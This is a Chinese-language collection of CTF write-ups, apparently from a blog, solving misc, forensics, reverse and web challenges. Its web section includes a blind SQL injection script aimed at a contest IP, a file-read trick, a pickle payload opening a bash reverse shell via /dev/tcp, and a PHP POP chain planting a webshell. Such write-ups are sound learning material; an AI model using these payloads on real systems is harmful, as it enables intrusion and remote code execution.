参考：https://blog.csdn.net/weixin_44362969/article/details/105616531第一步：python pyinstxtravtor.py xxxxx.exe第二步：得到一个文件夹其中有一个struct 跟 xxxxx（都没有后缀名）十六进制查看struct，xxxxx。会发现xxxxx比struct少了一行这时将struct的那一行复制给xxxxx，然后xxxxx保存后添加后缀xxxxx.pyc第三步：使用uncompyle6（我是kali）uncompyle6 xxxxx.pyc &gt; xxxxx.py 得到 key = 'xxxxxxxxxxxxxxx'flag = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'data = ''for i in range(0, len(flag)): data += hex(ord(flag[i]) ^ ord(key[(i % 15)]))[2:].zfill(2)else: print(data.upper()) data = '12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122' 然后现在需要找key，但是我们知道flag{开头，因此可以反推出key前5位 f = [18,4,80,20,36]keys = 'flag{'for i in range(len(f)): print(chr(f[i]^ord(keys[i])),end='') 得到th1s_，直接winhex搜key keys = 'th1s_1s_th3_k3y's = '12045014240343684450506E5E1E1C165D045E6B52113C5951006F091E4F4C0C54426A52466A165B0122'for i in range(len(s)//2): print(chr(int(s[i*2:i*2+2],16)^ord(keys[(i % 15)])),end='') 其实这里预期搜key应该是内存取证用screenshot指令，可以看到key flag{20708c15-eb55-4cbc-930b-68de15c55b32} encrypted ad1积累了，学到了。是我傻了下载下来文件名为ZW5jcnlwdA，解码之后得到encrypt结合题目为ad1，所以应该是一个ad1的磁盘文件，并且加了密查看文件尾，能够看到一串base 但很明显，这里转过来了，因此复制出来脚本转一下 s = '''==gqxEjgKtDzKI/D1ajBJIcxvLrijkUVc28YA3sTmY8Ac+r3fiDWl80a44vbCwhxf8xwibLU6V1Ek31d7Q8W78VcYS+8Za1+IhG3hQ3NiLkbmqXUzb2M3Ou715G1xhX3lvi7Yj2CyTz68WQKzcoTvv4pZU+ISdQdNcoJEQSJhocwQAYgCUowrcMWAytwCo05H/yUQGTYA7acF8stHPUPScAoWdL/NW5FqASDAJRN7cM/3kR9GWzTw4WImS36/C/94OBX1jJQVssAnd1NPD2F9EcX0GS2L9GIzdPyL5kZgZ8I2ShrzGo//HX5G+IqTcKRqsB5TAOddb4lTp/r6XowLqAY9IZJAGoAR9kcrKNzwsJXn6HZN29ilFTCVnwRqDpDulps/c2fyInUqsHzZxctm5iiCZRiy1XjcyLrJtRKbTvyfXY1K7D1Q+dgeKbzHMihscHQiBL+WMG/3Drwsz/vQiXdS7QCpNU230WH0HXZiqItJOfPLrpR5L7gVPjDC1WRlB2J169jNBIABGoAFCd8AqBrKhkTxfHOGZOugFK5RXT2+9S1rZEGMg5bxtBgNzeFo9pq2RtXAeWgXcJXSUC9MFnY5fbuToUSOlvsYr4CKk99EFiX7S1YU+EohUTs6hRIXbt6EdzkVQsZbDkgLIrjiOyRXO20Quq/a09PqC/ZqXz+mztjgRvlPYj4fgNABGoAxIhFqK1LV4121nsmnKfgPLUTEZk1bG05dULkA86/AdRgbJWJ+38/4Z+KGRT8Kqu2dQ4f47fSp+OQL76S4ur0Vmk2vXHOZqXuZIvBIV/5ZmO8uC5sdyT+Cb+319ct8Twfc9lACABWXDG5kijTdzytbabEFmONqNHlOutjTFjGmWOABGoABFWJTb6In8Or2leNITMvoTZeew52vTTGfAWmLeNfHh+qgRGt6QmpHt8+YqUyQr6HMFq5bNIHHeLDiPc6R6/eaiCZ2VYYf8G6G9vfzZLyb4JD8WHP3q4+gPlg+n1xQCsv+t5cGuhLJhPoD69aIgB0rxiEDzV6zG3SqziFZXjYtyXYpZ2oFEWTbXBMhnTucJXTRrxktXXxP3e1cRCbX0VZXxpZeLqd62O9s5QnfJJxSsHOaR8YZ2ONVLtotpFB6/WDX392066TjppXfKSRqD7QMDNO0Xd0nvRYfvAW2T9jsEPxPx2ZCV+JPYu2SKneIYz+QYYcaPA1zaE+aypIzG6SfCQABIoABAQADIQdDBG79zq8d0RhLOCxVaKSLcSQCTRtETiTLUYUyYk0WRs709wlDEsm0VsQI+X7HDSxaQJeIBWzZUaAs0ALuIqW4kw5Ny6ZSN1n52HJQMEJV50RwrFxjgH5DfLGa7P2nQJWivL02fgBeaGtjkSi86zoPwOmmYnocbP3Ad0tbQtXECvOEUiz8TsbgalR5bkKpSTmR98NCO9SKAVUN5IM8uOnl2ct/37JLMYa+fGZQ3I4ZHZmJN8vOANsnCNs68+QVWtRIo4fAp2QqHpmn/Is8OeOcwEJkwA3HJvJbHLIw0vleLaqwCP9UfXGHlBbknjJ4Deqb5RqnHQsN383ey+IADewAEQACKAABIApEIIM'''print(s[::-1]) 得到一个base串，看了之后应该类似于RSA之类的。然后打开搞磁盘文件常用的FTK，发现FTK能解密，于是为了研究，主动去生成了一个ad1 然后反正就生成一个ad1，记得生成的文件给他加个密注意到正确的文件头应该是41 44于是将题目的文件尾base删掉、文件头00 00 改成 41 44然后FTK里点击decrypt ad1选项可以注意到能使用证书来解密，于是尝试。然鹅比赛期间我一直没添加—–BEGIN RSA PRIVATE KEY—–头和—–END RSA PRIVATE KEY—–尾，一直是加的—–BEGIN PRIVATE KEY—–，导致没解出来，我麻了如图，然后保存为pfx文件。解密之后，用FTK挂载此文件这里我挂载到了H盘直接想到时间来作为2进制，2进制转ascii于是写个脚本转换 import oslist = ['']*392i = 0for j in range(392): list[j] = os.path.getmtime('H:\\\\'+str(j)+'.crypto')print(list)flag = ''for i in range(392): if(str(list[i]) == '1629859254.863367'): flag += '0' else: flag += '1'print(flag)tmp = ''for k in range(len(flag)): tmp += flag[k] if len(tmp) == 8: print(chr(int(tmp,2)),end='') tmp = '' 得到 You are so cool!!! this is your key: 6a90383cd08c 然后这392个文件是crypto文件 用这个，然后用这个key来解0.crypto和1.crypto(因为这两个时间不一样) flag{ba40c40b-1356-4fc6-8cc7-6a90383cd08c} 协议藏在s7里的秘密下载下来的流量包是部分损坏的，使用网站在线修复http://f00l.de/hacking/pcapfix.php然后打开流量包，发现有png，但是就如此提取，必定会混入奇奇怪怪的东西于是观察之后，用tshark来提取 tshark -r Ks3qlAF1bTuysqpJ.pcap -T fields -e s7comm.resp.data -Y “s7comm.param.func == 0x05 and ip.src==192.168.139.1” &gt; png.txt 得到16进制数用010打开，将十六进制数复制进去，即可得到图片，但是明显发现高度不对，因此修改任意高度，得到flag flag{FSfeQefjg} 老练的黑客和之前工控的那道，不能说是完全相似，只能说是一模一样类原题博客&amp;&amp;赶快关注工控大佬的博客根据此博客，能直接找到错误的值第1199流找到22b8然后根据观察前面的流，发现read的值是跟在过滤之后的第2个流然后尝试理解提交 flag{22b81194} Reversereverse1SM3 然后把下图的复制进脚本 百度一个国密SM3脚本 from math import ceil################################################################################ 国产SM3加密算法###############################################################################IV = &quot;7380166f 4914b2b9 172442d7 da8a0600 a96f30bc 163138aa e38dee4d b0fb0e4e&quot;IV = int(IV.replace(&quot; &quot;, &quot;&quot;), 16)a = []for i in range(0, 8): a.append(0) a[i] = (IV &gt;&gt; ((7 - i) * 32)) &amp; 0xFFFFFFFFIV = adef out_hex(list1): for i in list1: print(&quot;%08x&quot; % i) print(&quot;\\n&quot;)def rotate_left(a, k): k = k % 32 return ((a &lt;&lt; k) &amp; 0xFFFFFFFF) | ((a &amp; 0xFFFFFFFF) &gt;&gt; (32 - k))T_j = []for i in range(0, 16): T_j.append(0) T_j[i] = 0x79cc4519for i in range(16, 64): T_j.append(0) T_j[i] = 0x7a879d8adef FF_j(X, Y, Z, j): if 0 &lt;= j and j &lt; 16: ret = X ^ Y ^ Z elif 16 &lt;= j and j &lt; 64: ret = (X &amp; Y) | (X &amp; Z) | (Y &amp; Z) return retdef GG_j(X, Y, Z, j): if 0 &lt;= j and j &lt; 16: ret = X ^ Y ^ Z elif 16 &lt;= j and j &lt; 64: # ret = (X | Y) &amp; ((2 ** 32 - 1 - X) | Z) ret = (X &amp; Y) | ((~ X) &amp; Z) return retdef P_0(X): return X ^ (rotate_left(X, 9)) ^ (rotate_left(X, 17))def P_1(X): return X ^ (rotate_left(X, 15)) ^ (rotate_left(X, 23))def CF(V_i, B_i): W = [] for i in range(16): weight = 0x1000000 data = 0 for k in range(i * 4, (i + 1) * 4): data = data + B_i[k] * weight weight = int(weight / 0x100) W.append(data) for j in range(16, 68): W.append(0) W[j] = P_1(W[j - 16] ^ W[j - 9] ^ (rotate_left(W[j - 3], 15))) ^ (rotate_left(W[j - 13], 7)) ^ W[j - 6] str1 = &quot;%08x&quot; % W[j] W_1 = [] for j in range(0, 64): W_1.append(0) W_1[j] = W[j] ^ W[j + 4] str1 = &quot;%08x&quot; % W_1[j] A, B, C, D, E, F, G, H = V_i &quot;&quot;&quot; print &quot;00&quot;, out_hex([A, B, C, D, E, F, G, H]) &quot;&quot;&quot; for j in range(0, 64): SS1 = rotate_left(((rotate_left(A, 12)) + E + (rotate_left(T_j[j], j))) &amp; 0xFFFFFFFF, 7) SS2 = SS1 ^ (rotate_left(A, 12)) TT1 = (FF_j(A, B, C, j) + D + SS2 + W_1[j]) &amp; 0xFFFFFFFF TT2 = (GG_j(E, F, G, j) + H + SS1 + W[j]) &amp; 0xFFFFFFFF D = C C = rotate_left(B, 9) B = A A = TT1 H = G G = rotate_left(F, 19) F = E E = P_0(TT2) A = A &amp; 0xFFFFFFFF B = B &amp; 0xFFFFFFFF C = C &amp; 0xFFFFFFFF D = D &amp; 0xFFFFFFFF E = E &amp; 0xFFFFFFFF F = F &amp; 0xFFFFFFFF G = G &amp; 0xFFFFFFFF H = H &amp; 0xFFFFFFFF V_i_1 = [] V_i_1.append(A ^ V_i[0]) V_i_1.append(B ^ V_i[1]) V_i_1.append(C ^ V_i[2]) V_i_1.append(D ^ V_i[3]) V_i_1.append(E ^ V_i[4]) V_i_1.append(F ^ V_i[5]) V_i_1.append(G ^ V_i[6]) V_i_1.append(H ^ V_i[7]) return V_i_1def hash_msg(msg): # print(msg) len1 = len(msg) reserve1 = len1 % 64 msg.append(0x80) reserve1 = reserve1 + 1 # 56-64, add 64 byte range_end = 56 if reserve1 &gt; range_end: range_end = range_end + 64 for i in range(reserve1, range_end): msg.append(0x00) bit_length = (len1) * 8 bit_length_str = [bit_length % 0x100] for i in range(7): bit_length = int(bit_length / 0x100) bit_length_str.append(bit_length % 0x100) for i in range(8): msg.append(bit_length_str[7 - i]) # print(msg) group_count = round(len(msg) / 64) B = [] for i in range(0, group_count): B.append(msg[i * 64:(i + 1) * 64]) V = [] V.append(IV) for i in range(0, group_count): V.append(CF(V[i], B[i])) y = V[i + 1] result = &quot;&quot; for i in y: result = '%s%08x' % (result, i) return resultdef str2byte(msg): # 字符串转换成byte数组 ml = len(msg) msg_byte = [] msg_bytearray = msg # 如果加密对象是字符串，则在此对msg做encode()编码即可，否则不编码 for i in range(ml): msg_byte.append(msg_bytearray[i]) return msg_bytedef byte2str(msg): # byte数组转字符串 ml = len(msg) str1 = b&quot;&quot; for i in range(ml): str1 += b'%c' % msg[i] return str1.decode('utf-8')def hex2byte(msg): # 16进制字符串转换成byte数组 ml = len(msg) if ml % 2 != 0: msg = '0' + msg ml = int(len(msg) / 2) msg_byte = [] for i in range(ml): msg_byte.append(int(msg[i * 2:i * 2 + 2], 16)) return msg_bytedef byte2hex(msg): # byte数组转换成16进制字符串 ml = len(msg) hexstr = &quot;&quot; for i in range(ml): hexstr = hexstr + ('%02x' % msg[i]) return hexstrdef KDF(Z, klen): # Z为16进制表示的比特串（str），klen为密钥长度（单位byte） klen = int(klen) ct = 0x00000001 rcnt = ceil(klen / 32) Zin = hex2byte(Z) Ha = &quot;&quot; for i in range(int(rcnt)): msg = Zin + hex2byte('%08x' % ct) # print(msg) Ha = Ha + hash_msg(msg) # print(Ha) ct += 1 return Ha[0: klen * 2]def sm3_hash(msg, Hexstr=0): &quot;&quot;&quot; 封装方法，外部调用 :param msg: 二进制流（如若需要传入字符串，则把str2byte方法里msg做encode()编码一下，否则不编码） :param Hexstr: 0 :return: 64位SM3加密结果 &quot;&quot;&quot; if (Hexstr): msg_byte = hex2byte(msg) else: msg_byte = str2byte(msg) return hash_msg(msg_byte)print('\\n')if __name__ == '__main__': enc=['6b8575c6092240cde08414dafd535bee','f0f659f2951290ad5e076b3fe5e70425','c1d6c663570de9fad13ddef955d8a02b','14c4e442fba6d820ea90ae73ed90ad83','25d997669868d0cf89782349256efb33','78b1ea6bb1ac10287864c8f52d2758b6','67d1259c26765356ddb58c6faf28080c','c1e14e0c86f55ba1d74b35b66f96ad36','3e4f3ee942d1a57182e24df201b7022b','c35557f7e5c389061fb2e2ffa1a644ad','15593844fae18fe1a25f3a9017c73810','c6c21ca591a63755fd77bf5c55a0238a','f90cb529875e83cc191c0e10ead6f73e','3ddbe25f9b183c3e2c33c3b1e501fcd8','30fdf04c347f1d4e335bda670d54eaaf','33feb100c8c7c3769af6e9d26486c646'] import string flag='' e='' map = string.printable for i in range(len(enc)): for k in map: flag=''+k if sm3_hash(bytes(str(flag).encode()))[:32]==enc[i]: print(flag) 倒数第5的flag = ‘’+k，每次输出一个，将将其填入，直到最后即可当最后填入wel30m_t0_sm3!!!此时输出空白，则此为key flag{g0042ye_t0_sm4} 2048小游戏一个不知道啥鬼游戏，找到有flag的逻辑有个不知道什么的运算。但是经过几次测试，发现分数越多，那个函数得到的值越小。，那就i慢慢凑出来，发现分数为0x2100时刚好满足条件，然后下面就是根据这个分数，异或一个固定值得到一个数，然后下面就是验证前四个数值，就是上面那个数的倒数，然后下面就是对0x2100%8+48，0x2100/8| 最后 flag{b0d800402} webez_sql和Inctf的Rssa其中的一个小点考点相同，直接改脚本即可 原文连接：https://www.yuque.com/docs/share/f2e36905-38ae-4c20-8749-5aba747e5b91?# #-- coding:UTF-8 --import requestsdef strtohex(s): ss = &quot;0x&quot; for i in s: ss += str(hex(ord(i))).replace(&quot;0x&quot;,'') return ssburp0_url = &quot;http://116.62.239.41:4323/&quot;burp0_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}character = &quot;zsuaqwxcderfvbgtyhnmjuiklop0123456789.&quot;flag = &quot;&quot;for j in range(1,100): for i in character: if j &gt;= 1 and j &lt;=6 : payload = strtohex(flag + i + &quot;%&quot;) else: payload = strtohex(&quot;%&quot; + flag[-6:] + i + &quot;%&quot;) sql = &quot;1,2 as username from user where username=0x61646d696e and password like {} union select 1&quot;.format(payload) params = { &quot;sql1&quot;:&quot;%27&quot;, &quot;sql2&quot;:sql } res = requests.get(burp0_url, headers=burp0_headers,params=params) print i + &quot; : &quot; + res.text if &quot;nonono&quot; in res.text: print &quot;字符过长！！！&quot; exit(0) if &quot;nop&quot; in res.text: flag += i print flag break if i == &quot;.&quot;: print flag exit(0) flag为53a2d36d72760586dfc400e54b54564b ez_web考点：文件读取、Python反序列化 右键注释中获得&lt;!-- ?pic=1.jpg --&gt;，发现是一个任意文件读取，使用http://116.62.239.41:4322/?pic=/app/app.py读取源文件，源码如下 import pickleimport base64from flask import Flask, requestfrom flask import render_template,redirect,send_from_directoryimport osimport requestsimport randomfrom flask import send_fileapp = Flask(__name__)class User(): def __init__(self,name,age): self.name = name self.age = agedef check(s): if b'R' in s: return 0 return 1@app.route(&quot;/&quot;)def index(): try: user = base64.b64decode(request.cookies.get('user')) if check(user): user = pickle.loads(user) username = user[&quot;username&quot;] else: username = &quot;bad,bad,hacker&quot; except: username = &quot;CTFer&quot; pic = '{0}.jpg'.format(random.randint(1,7)) try: pic=request.args.get('pic') with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() except: pic='{0}.jpg'.format(random.randint(1,7)) with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() return render_template('index.html', uname=username, pic=p )if __name__ == &quot;__main__&quot;: app.run('0.0.0.0') 知道了是python的反序列化漏洞，这里直接用巅峰极客2021 opcode的Payload即可 import base64import pickletoolsa = b'''(cossystemS'bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;'o.'''a = pickletools.optimize(a)print(base64.b64encode(a)) 获得flagflag{a806de95e0fd1e1ba5de6ed1ef20adb2} ez_php构造POP链如下 &lt;?phpclass fz{ protected $v0id; function __construct( $v0id){ $this-&gt;v0id = $v0id; }}class v0id{ protected $xin; protected $name; protected $group; protected $url; function __construct($group, $name, $url,$xin){ $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $this-&gt;xin=$xin; }}class xin{ protected $logwriter; function __construct($writer){ $this-&gt;logwriter = $writer; }}class host{ protected $filename; protected $format; function __construct($filename, $format){ $this-&gt;filename = $filename; $this-&gt;format = $format; }}class yang{ protected $filters; protected $endl; function __construct($filters, $endl){ $this-&gt;filters = $filters; $this-&gt;endl = $endl; }}class c4t {};$a=new c4t();$b=new yang($a,&quot;&quot;);$c=new host(new v0id(&quot;/../../../../../var/www/html/atao.php&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;),$b);$d=new xin($c);$f=new v0id('&lt;?=`ls`;?&gt;','../../../../../../var/www/html',&quot;&quot;,$d);$g=new fz($f);echo urlencode(serialize($g)); 接着访问fffffffffffllllllllaaaag文件，下载下来 直接获得flagflag{v3rY_Ez_Php_P0p}","link":"/posts/1010/"},{"title":"2021陇原战疫WP","text":"2021陇原战疫WP 在看到该比赛为公益比赛，获胜者可为甘肃疫情地区提供援助物资时，我们决定以 n03tAck 战队名义参加比赛安全人员除了技术上的追求，更是要有人的温情。此次比赛 n03tAck 最后取得第二名的成绩，成功为甘肃疫情地区捐赠 5000 元疫情物资，爱是桥梁，大爱无疆，希望我们都是一位有温度的安全爱好者。诚愿疫情早日过去 注：打*的是赛后出的 MiscsoEasyCheckinbase32，但有问题，倒数出现了0$，0--&gt;O,$---&gt;S，得到一串hex。结果hex那里又有问题，具体是出在83¥6988ee这里根据规律,每6个字节的第1个字节为e，然后把¥替换成e得到社会主义核心价值观编码，但是还是有个地方是错误的，中间有一段为：和谐斃明平然后把他那个斃随便改一下，我改的“富强”解码得到的SET{Qi2Xin1Xie2Li4-Long3Yuan0Zhan4Yi4}根据拼音，可以知道是Yuan2所以最终flag为： SET{Qi2Xin1Xie2Li4-Long3Yuan2Zhan4Yi4} 打败病毒游戏打开之后发现在末地，打完末影龙后没有反应，flag藏在终末之诗里，于是直接去找文本在.minecraft/version/陇原战“疫”.jar下将其改为zip，找到assets/minecraft/texts/end.txt，得到11F9sACbBBBWKTiClYDtNF2yIEfThXdfIGPxFbase62解码即可 SETCTF{Fi9ht1ng_3ItH_V1rUs} SOS拨号音，踩正确的来组合出flag用手机录音，然后m4a格式转wav格式，之后DTMF，因为录的总有问题，所以一共录了三次 前面都没出现8，这次终于出现了8，所以应该是6830AB1C75，得到flag EasySteg哥哥球球了别套了再套下去套神都哭了呜呜呜 JK为单图盲水印(java)，用imagein也行的 然后在flag.rar的注释里面有一串tab和space组成的密文，转space转0，tab转1 然后解压，在flag.png的末尾有另一个png，那个png明显有flag字样，用stegsolve反一下色即可看清 flag{156cca8e 然后还在这个图片后面发现了明显的oursecret的特征，结合上面的base64(-b81b-) 得到oursecret的密码为LWI4MWIt 除了数字以外，没有重复字符，里面还有{}，结合01串，得出为哈夫曼编码，利用红明谷的脚本即可解码 对应关系看脚本即可理解 import copyimport redef dfs(c, d): if len(c.keys()) == 1: # g = {'j':29,'z':31,'7':25,'e':31,'l':23,'6':37,'4':32,'p':38,'h':27,'g':26,'x':28,'i':25,'u':27,'n':25,'8':36,'0':24,'o':23,'c':28,'y':24,'1':29,'b':26,'m':27,'2':28,'v':25,'d':33,'f':28,'9':33,'t':21,'w':22,'a':31,'r':24,'s':16,'k':32,'5':25,'q':23,'3':32,'{':1,'-':4,'}':1,} # num = 0 # for k in g.keys(): # num += g[k] * len(d[k]) # print(num) # print(c, d) g = {} for k in d.keys(): g[d[k]] = k a = '1110111111000100001111000011010001101111100110100011110111100010100111110111001101111100011000111111111101011100011111100111000011010001111010011011111001110111100010000111001110011110111000111111100111011111011011101011110111110101101101101000110101011101011111111011110111101101110101111010011010110100011100100011010101111010111110110110111100011010111010111110110110111001001011011110100111010111111010111111011110111101001111010111110111101011100100111100101011011101110111111001010110100100110111110011111001101000111110111001011001110000111000011110000110111110011000011100001101100110100011100001111110011110000110110011010001110011101100001110110001001111111110010110011010001111011110110010011011111000001111100010010001001111101110110111111101101001001001011011101111101101101111001101001011011111100111110110110110110111110111010110111011110011111011011011010000110111111001111110111100111010111110011010011011110101001101110111100110110111101001101011101011111001101111011101101010111010111111001111110111010110110110101001101011111101001101000111010010111000010011001110111110111101101111101101110111010110100101101101101011010111111101111001110111111110011010110100101101111011011101100111001000001111001100100101011000000111100101011001000101100100000011001011001001000001111001100100101011000000111100101011001011111111001010001010001010010000011110011001001010110000001111001010110010001011001010001010000111100100000111100110010010101100000011110010101100101010010101100101010010000011110011001001010110000001111001010110010011001001010110000011011111001000001111001100100101011000000111100101000101000110111110010000001100101010010000011110011001001010010101100000011110010101100100010001001000011111110001010010000011110011001001010110000001111001010110010111111110010100010110001000100100000111100110010010101100000011110010100010100011011111001000000110010101001000001111001100100101011000000111100101011001001100100101011000001101111100100000111100110010010101100000011110010101100100010110010000001100101100100100000111100110010010101100000011110010100010100010100101011000001101111100100000111100110010010101100000011110010100101011001000101100100000011001011001001000001111001100100101011000000111100101011001011111111001010001010001010010000011110011001001010110000001111001010110010001000100100001111111000101001000001111001100100101011000000111100101011001000101100100000011001011001001000001111001100100101011000000111100101011001010100100000011001011111111001000001111001100100101011000000111100101011001000101100100000011001011001001000001111001100100101011000000111100101011001000100010010100100001111111000101001000001111001100100101011000000111100101011001010100100000011001011111111001000001111001100100101011000000111100101000101000101001010110000011011111001000001111001100100101011000000111100101000101000110111110010000001100000011110010000011110011001001010110000001111001010001010000001001010001010000111111011010011110011101011111011100001011010110101111010001111100110111110101111110110101010011101111101100100000101111011010111101101101110011001110001100011111001110010000010111100010111101111111101101101110000111010000101111110001100000110001110010100100000110000101110000100010110111100000101110011111110000111011010111101001101001101111101000100101111101101011111100111111001110001100001000011011111000001111100010011001110111101111111011111001000111000011101101110000111011011110011101111111011011010110100011111000100101111111011100000100000101110010111100011010110100011111101111001110101111010111011011100100110011101111100111101111100000001001001101001101111111101101011110111011110011101001101111010100110111011101011110011100000011010010111111000100110011101111101011110111110111' m = '' st = 0 while st &lt; len(a): ed = st + 1 while ed &lt;= len(a): if a[st:ed] in g.keys(): m += g[a[st:ed]] break else: ed += 1 st = ed print(m) else: k0 = list(c.keys())[0] k1 = list(c.keys())[1] if c[k0] &gt; c[k1]: k0, k1 = k1, k0 for k in list(c.keys())[2:]: if c[k] &lt; c[k1]: if c[k] &lt; c[k0]: k0, k1 = k, k0 else: k1 = k for a in k0: d[a] = '0' + d[a] for a in k1: d[a] = '1' + d[a] c[k0+k1] = c[k0]+c[k1] del c[k0] del c[k1] dfs(copy.deepcopy(c), copy.deepcopy(d))c = {'n':9,'S':2,'B':3,'I':6,'U':6,'L':1,'O':3,'R':2,'F':3,'Y':1,'G':2,'H':3,'v':9,'N':2,'M':1,'Z':1,'D':6,'T':1,'h':18,'o':16,'u':17,'b':9,'s':7,'r':4,'g':8,'f':10,'a':14,'m':2,'i':20,'p':2,'e':14,'w':7,'q':2,'y':8,'P':1,'J':2,'E':2,'C':1,'V':1,'A':1,'j':4,'k':5,'x':5,'t':3,'c':6,'8':24,'9':56,'{':1,'3':217,'d':97,'4':83,'6':54,'0':25,'1':12,'2':10,'5':8,'7':10,'}':1,'l':4,'Q':1,'W':1,'z':1}d = {}for k in c.keys(): d[k] = ''dfs(copy.deepcopy(c), copy.deepcopy(d))#nSBIULORFYGHvNMIOUZSDTNhnoubuosrgfbouvasmruiohauiopewgvfbwuivpqynqwUPIFJDDBUEDUIDHBUIDCVHJIOAejikxneiwkyiohwehiooiuyhiosehfhuiaetyhovauieyrghfuotgvac89xcboiyuweagihniaweo{3d46303d39463d39383d41393d46303d39463d39323d38433d46303d39463d39383d38463d46303d39463d39333d39333d46303d39463d39303d39453d46303d39463d38453d41333d46303d3d39463d39373d42433d46303d39463d39323d38373d46303d39463d38453d41333d46303d39463d39303d39453d46303d39463d39383d41393d46303d39463d38433d39453d46303d39463d3d39383d41393d46303d39463d39323d38433d46303d39463d39373d42433d46303d39463d39383d41393d46303d39463d39333d41323d46303d39463d39383d41393d46303d39463d39373d3d42433d46303d39463d39333d41323d46303d39463d38433d39453d46303d39463d38453d41463d46303d39463d38443d3846}huilagsieufrcb78QWEGF678Rniolsdf149687189735489246avaeukighf6497ejixcnbmlolohnbasik2647893hasfhuvzxchbjkaefgyhuetyuhjadfxcvbn {}里面的内容拿去hex，发现是Quoted Printable，但是有些地方出现了两次==，于是将其重复的删掉，得到 😩💌😏📓🐞🎣🗼💇🎣🐞😩🌞😩💌🗼😩📢😩🗼📢🌞🎯🍏 不是base100，所以拿去试试国外的一种，以前做la佬的ctfshow月饼杯_共婵娟用到的 https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17 拼接起来，得到flag flag{156cca8e-b81b-4157-9f39-4c41f4a4facb} *ez_mischint是零宽，说的是和piet很像的一种esolang，然后结合ctfshow6月赛八神的babyLSBwithHelicopter 可以知道是brainloller 然后010打开，提示解出来是后面steghide的密码，并且CRC报错，用爆CRC的脚本一爆就发现正确宽度为14，高为12 用bftools解，bftools.exe decode brainloller bf.png，得到的bf再去解码得到密码Hello Worl 但是解不出来，于是用我6月赛写的脚本去解https://blog.csdn.net/qq_42880719/article/details/117479024 解出来是Hello Worle!，我猜是Hello World! 结合题目新上的hint，得到的密码我试过有 Hello WorlHello_WorlHello Worle!Hello_Worle!Hello World!Hello_World!Hello WorldHello_World 可惜都不对，通过出题人的朋友问了下出题人，他朋友也表示解不出来，但是出题人是能解出来的(好像用的是本地的附件)所以我总感觉是比赛题目附件的问题？ —17:02—:经过一个半小时的积极反馈 就bftools.exe解出来的把空格替换为下划线Hello_Worl解steghide，得到个文本后面是一个熊曰，然后就完事 ReEasyReflag就在常量里面。。 flag{fc5e038d38a57032085441e7fe7010b0} findme发现判断长度为26位 tls，找到主逻辑，发现是一个没有魔改的rc4.那当然是用他流密码的性质做。我们输入26个0，然后得到最后的密文，然后在异或得到密钥流，在异或我们的比对密文。即可得到flag s=[ 0xD4, 0x27, 0xE1, 0xB2, 0xF4, 0x9F, 0x4C, 0xDC, 0xBC, 0x1B, 0x80, 0xD2, 0x44, 0x8B, 0xEA, 0x33, 0x02, 0x4E, 0x41, 0xEB, 0x8D, 0x23, 0x6F, 0xBC, 0x00, 0x8B]d='00000000000000000000000000'a=[0xFFFFFFB7, 0x00000052, 0xFFFFFF85, 0xFFFFFFC1, 0xFFFFFF90, 0xFFFFFFE9, 0x00000007, 0xFFFFFFB8, 0xFFFFFFE4, 0x0000001A, 0xFFFFFFC3, 0xFFFFFFBD, 0x0000001D, 0xFFFFFF8E, 0xFFFFFF85, 0x00000046, 0x00000000, 0x00000021, 0x00000044, 0xFFFFFFAF, 0xFFFFFFEF, 0x00000070, 0x00000032, 0xFFFFFFB5, 0x00000011, 0xFFFFFFC6]for i in range(len(a)): print((chr(s[i]^ord(d[i])^(a[i]&amp;0xff))),end='')#SETCTF{Th1s_i5_E2_5tRcm9!} arm打开入眼就是sbox，然后最下面主函数那里出现了很多aes，然后也看到了key，然后发现是cbc模式？但是解密出来前16位是对得，然后尝试ecb模式。直接得到flag from Crypto.Cipher import AESkey=b'this_is_a_key!!!'enc=long_to_bytes(0x1030a9254d44937bed312da03d2db9adbec5762c2eca7b5853e489d2a140427b)ae=AES.new(key,AES.MODE_ECB)print(ae.decrypt(enc)) easyre++花指令，去掉，我全部nop了，发现还差v4，然后再nop之前，下断得到v4得值v4=[0x271E150C, 0x3B322920, 0x5F564D44, 0x736A6158, 0x978E857C, 0xABA29990, 0xCFC6BDB4, 0xE3DAD1C8] 直接z3 v4=[0x271E150C, 0x3B322920, 0x5F564D44, 0x736A6158, 0x978E857C, 0xABA29990, 0xCFC6BDB4, 0xE3DAD1C8]from z3 import *s=Solver()a = [BitVec(f'a[{i}]', 32) for i in range(8)]v5=[]#this_is_a_key!!!for i in range(8): v5.append(a[i]^v4[(7 * i + 2) % 8])print(v5)for j in range(8): v5[j] ^= (v5[j] &lt;&lt; 7) v5[j] ^= v4[(7 * j + 3) % 8] v5[j] ^= v5[(5 * j + 3) % 8] v5[j] ^= (v5[j] &lt;&lt; 13) v5[j] ^= v4[(7 * j + 5) % 8] v5[j] ^= (v5[j] &lt;&lt; 17)en=[0xEEE8B042, 0x57D0EE6C, 0xF3F54B32, 0xD3F0B7D6, 0x0A61C389, 0x38C7BA40, 0x0C3D9E2C, 0xD64A9284]print(len(en))for i in range(8): s.add(v5[i]==en[i])print(s.check())m=s.model()from Crypto.Util.number import *d=b''for i in range(8): d+=long_to_bytes(m[a[i]].as_long())[::-1]print(d)#b'bd6a64f17bb3dc065b41a0aad1e48e98' *Eat_somethingwasm逆向。 另存为本地文件，发现base64加密了。。解密一下，然后保存为 wasm.wasm，然后用wasm2c 反编译成 c文件，然后再编译.c文件， 首先看到check函数入口 然后用ida打开，找到对应函数 结合动调，发现就是一个简单的异或 s=[ 0x86, 0x8B, 0xAA, 